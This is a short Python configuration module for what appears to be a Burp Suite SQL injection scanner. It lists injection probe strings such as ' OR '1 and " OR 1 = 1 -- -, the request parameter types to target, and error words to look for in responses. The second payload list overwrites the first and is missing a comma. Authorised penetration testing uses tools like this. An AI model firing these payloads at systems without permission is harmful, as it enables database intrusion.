from burp import IParameter

PAYLOADS = ["--","'", "''", "`", "``", ",", "\"", "\"\"", "/", "//", "\\", "\\\\", ";", "' or \"", "-- or # ", "' OR '1", "' OR 1 -- -", "\" OR \"\" = \"", "\" OR 1 = 1 -- -", "' OR '' = '", "'='", "'LIKE'", "'=0--+", " OR 1=1", "' OR 'x'='x", "%00", "/*...*/ ", "+", "||", "%", " AND 1", " AND 0", " AND true", " AND false", "1-false", "1-true", "1*56", "-2"]
PAYLOADS = ["--","'", "''", "`", "``", ",", "\"", "\"\"", "/", "//", "\\" ";", "'='", "%00", "/*...*/ ", "+", "||", "%"]

# Parameters list available at: https://portswigger.net/burp/extender/api/burp/iparameter.html
ALLOWED_PARAMETERS = [
    IParameter.PARAM_BODY,
    IParameter.PARAM_MULTIPART_ATTR,
    IParameter.PARAM_URL,
    IParameter.PARAM_XML,
    IParameter.PARAM_XML_ATTR
]

WORDS_TO_SEARCH_IN_RESPONSE = [
    "error",
    "exception",
    "sql",
    "whal"
]

HTTP_MAX_CONCURRENT_REQUEST = 1
HTTP_REQUESTS_DELAY = 1000

def isParameterAllowed(parameter):
    if parameter.getType() in ALLOWED_PARAMETERS:
        return True

def hasSomeAllowedTypeParameters(parameters):
    for parameter in parameters:
        if isParameterAllowed(parameter):
            return True
    return False
